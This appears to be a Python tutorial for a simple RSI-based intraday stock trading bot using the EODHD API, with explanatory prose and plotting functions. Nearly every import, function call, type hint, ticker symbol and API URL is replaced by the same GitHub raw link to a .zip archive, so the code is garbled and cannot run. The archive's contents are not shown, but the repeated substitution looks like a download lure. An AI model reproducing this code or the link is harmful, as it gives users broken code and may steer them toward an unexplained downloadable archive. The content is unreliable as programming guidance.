import requests
import json
import pandas as pd
import datetime
import time
import os
import pandas_ta as ta
import logging
import numpy as np
import https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip as go
import https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip as plt


# 1. Configuration
API_KEY = '----------------------------'   # Replace with your actual API Key
symbol = 'https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip'               
interval = '1m'                  # 1-minute intervals
from_date_str = '01-01-2025'     # MM-DD-Y (yyyy)
to_date_str   = '30-03-2025'     # MM-DD-Y (yyyy)
RSI_PERIOD = 14                  # default

# 2. Convert to Python datetime
from_date_obj = https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip(from_date_str, '%d-%m-%Y')
to_date_obj   = https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip(to_date_str, '%d-%m-%Y')

# 3. Convert to Unix timestamps
from_timestamp = int(https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip())
to_timestamp   = int(https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip())


#4. The Intraday Historical Data API endpoint typically follows this format:
url = (
    f'https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip{symbol}'
    f'?api_token={API_KEY}'
    f'&interval={interval}'
    f'&from={from_timestamp}'
    f'&to={to_timestamp}'
    f'&fmt=json'
)

# 6. Convert to a Pandas DataFrame
if https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip == 200:             
    data_json = https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip(https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip)
    df = https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip(data_json)
    print(df)
else:
    print("Failed to retrieve data:", https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip)
    
    https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip(columns={ 
        't': 'timestamp',
        'o': 'open',
        'h': 'high',
        'l': 'low',
        'c': 'close',
        'v': 'volume'
    }, inplace=True)
    # Convert timestamps to UTC datetime and set as index
   
    df['timestamp'] = https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip(df['timestamp'], unit='s', utc=True)
    https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip('timestamp', inplace=True)

    print(https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip())
    print(https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip())
    print(f"Error retrieving data: {https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip} - {https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip}")


    ------------------------------------------------------------------------------------------------------------------------------------------------------

Once we have reliable market data at your fingertips, the next logical step is to automate how you act on it. A *trading bot* allows us to execute strategies systematically, free from human bias and around the clock. Whether you’re focusing on short-term signals or multi-day patterns, bots help you streamline the process of analyzing data, entering positions, and managing risk. In the next section, we’ll explore how to create a simple RSI-based trading bot using the data you’ve extracted.


-------------------------------------------------------------------------------------------------------------------------------------------------------
**_Phase 2: Simple RSI-Based Trading Bot_**

With high-quality intraday data in hand, you can begin experimenting with trading strategies. A good starting point is the RSI (Relative Strength Index), a momentum oscillator that fluctuates between 0 and 100. Traditionally:

    - RSI below 30: Potentially oversold (a buy signal for some traders).
    - RSI above 70: Potentially overbought (a sell signal for some traders).

Below is an example script that downloads the same data, calculates the RSI using pandas_ta, and outputs hypothetical buy/sell signals based on RSI thresholds.


    #  Calculate RSI with a 14-bar period
    df['RSI'] = https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip(df['close'], length=14)

    #  Generate trading signals
    df['Signal'] = 0
    https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip[df['RSI'] <= 30, 'Signal'] = 1   # Buy signal
    https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip[df['RSI'] >= 70, 'Signal'] = -1  # Sell signal

    print(df[['open', 'high', 'low', 'close', 'volume', 'RSI', 'Signal']].head(100))

    #  Simulating trades
    position = 0  # 1 if holding a buy, -1 if short, 0 if neutral
    for idx, row in https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip():
        if row['Signal'] == 1 and position == 0:
            print(f"{idx} => BUY at {row['close']:.2f} (RSI={row['RSI']:.2f})")
            position = 1
        elif row['Signal'] == -1 and position == 1:
            print(f"{idx} => SELL at {row['close']:.2f} (RSI={row['RSI']:.2f})")
            position = 0
    else:
            print(f"Error retrieving data: {https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip} - {https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip}") 


--------------------------------------------------------------------------------------------------------------------
***_Summary_***

1. Importing Libraries:

        requests for API requests,
        json for handling data,
        datetime for date manipulation,
        pandas for data processing,
        pandas_ta for technical analysis.

2. Configuration Parameters:

    API_KEY: API access key.
    symbol: Apple stock (https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip).
    interval: Data with a 1-minute interval.
    from_date_str and to_date_str: Date range to fetch.

3. Date Conversion:

    Converts string dates into UNIX timestamps.

4. Constructing the URL and sending an HTTP request to the API:

    The request is sent to https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip with the defined parameters.

5. Data Processing:

    If the request is successful (status_code == 200), the response is converted into a Pandas DataFrame.
    Columns (o, h, l, c, v) are renamed to more meaningful names (open, high, low, close, volume).
    Timestamps are adjusted.

6. Calculating RSI:

    Uses https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip with a 14-period setting.

7. Generating Trading Signals:

    Buy (Signal = 1): When RSI ≤ 30 (oversold).
    Sell (Signal = -1): When RSI ≥ 70 (overbought).

8. Simulating Trades:

    A position variable tracks if a trade is open.
    When a buy signal is generated, it prints a buy action with price and RSI.
    When a sell signal is generated, it prints a sell action with price and RSI.

9. Error Handling:

    If the API request fails, it displays an error message with the status code.



def plot_closing_price(
    ax: https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip, 
    dataframe: https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip, 
    ticker: str = "https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip", 
    color: str = 'blue',  # Default color changed to match the plot
    linewidth: float = 2.0
) -> None:
    """ 
    (Docstring)
    Plots the closing price of a stock on the provided Axes object.

    Parameters:
        ax (https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip): The Matplotlib Axes object to plot on.
        dataframe (https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip): DataFrame containing stock data with a 'close' column.
        ticker (str): The stock ticker symbol for the title.
        color (str): Color of the line in the plot.
        linewidth (float): Width of the line in the plot.

    Returns:
        None
    """
    
    # Plot Closing Price
    https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip(https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip, dataframe['close'], label='Close Price', color=color, linewidth=linewidth)
    
    # Set Titles & Labels
    https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip(f"{ticker} - Closing Price", fontsize=14, fontweight='bold')
    https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip("Price ($)", fontsize=12)
    
    # Improve Readability
    https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip()
    https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip(True, linestyle="--", alpha=0.6)
    https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip(axis="x", rotation=45)  # Rotate x-axis labels for better visibility

# Example usage:
#fig, ax = https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip()
#plot_closing_price(ax, your_dataframe_here, ticker="https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip")
https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip()


def create_price_rsi_plot(dataframe: https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip, rsi: https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip, figsize: tuple = (12, 6)) -> tuple[https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip, list[https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip]]:
    """
    Creates a plot with two subplots: one for the closing price and another for the RSI.

    Parameters:
        dataframe (https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip): DataFrame containing stock data with a 'close' column.
        rsi (https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip): Series containing RSI values.
        figsize (tuple): Size of the figure.

    Returns:
        tuple: A tuple containing the Figure and a list of Axes objects.
    """
    fig, axs = https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip(nrows=2, figsize=figsize, sharex=True)

    # Plot Closing Price
    axs[0].plot(https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip, dataframe['close'], label='Close Price', color='blue', linewidth=1.5)
    axs[0].set_title("Closing Price", fontsize=14, fontweight='bold')
    axs[0].set_ylabel("Price (USD)", fontsize=12)
    axs[0].legend()
    axs[0].grid(True, linestyle="--", alpha=0.6)

    # Plot RSI
    axs[1].plot(https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip, rsi, label='RSI', color='orange', linewidth=1.5)
    axs[1].axhline(70, linestyle='--', color='red', alpha=0.5)  # Overbought line
    axs[1].axhline(30, linestyle='--', color='green', alpha=0.5)  # Oversold line
    axs[1].set_title("Relative Strength Index (RSI)", fontsize=14, fontweight='bold')
    axs[1].set_ylabel("RSI", fontsize=12)
    axs[1].legend()
    axs[1].grid(True, linestyle="--", alpha=0.6)

    # Improve x-axis visibility
    axs[1].tick_params(axis="x", rotation=45)  # Rotate x-axis labels for better visibility

    https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip("Date", fontsize=12)
    
    return fig, axs



    def plot_rsi(ax, df):
   
    #Ensure RSI exists in the dataframe
    if 'RSI' not in https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip
        print("Error: RSI column not found in DataFrame.")
        return
    
    #Plot RSI line
    https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip(https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip, df['RSI'], label="RSI", color="blue", linewidth=2.0)
    
    #Overbought & Oversold Levels
    overbought_level, oversold_level = 70, 30
    https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip(overbought_level, linestyle="--", color="green", label=f"Overbought ({overbought_level})")
    https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip(oversold_level, linestyle="--", color="red", label=f"Oversold ({oversold_level})")
    
    #Format the chart
    https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip("Relative Strength Index (RSI)", fontsize=14, fontweight="bold")
    https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip("RSI Value", fontsize=12)
    https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip("Date/Time", fontsize=12)
    
    #Set Y-axis limits (optional)
    https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip(0, 100)
    
    #Enable grid and legend
    https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip()
    https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip(True, linestyle="--", alpha=0.6)

#Usage Example
fig, axs = https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip(2, figsize=(12, 6), sharex=True)
plot_rsi(axs[1], df)
https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip()


# Configuration
symbol = "https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip"
interval = "10m"
range_days = "90d"
api_key = "________________________"   # Replace with your actual API Key
from_date_str = '01-01-2025'     # MM-DD-Y (yyyy)
to_date_str   = '31-03-2025'     # MM-DD-Y (yyyy)

url = f"https://github.com/SattikMohanta/Trading-Bot-with-the-Intraday-Historical-Data-API-from-EODHD---NYSE-Stock/raw/refs/heads/main/iNuron BI ML PROJECYTS INTERMEDIATE ADVANCED FOR OPEN SOURCE PROJECT/Bot-Intraday-NYS-AP-Trading-EODH-Stock-Data-Historical-with-from-the-v3.6.zip"

# Fetch historical/eod data
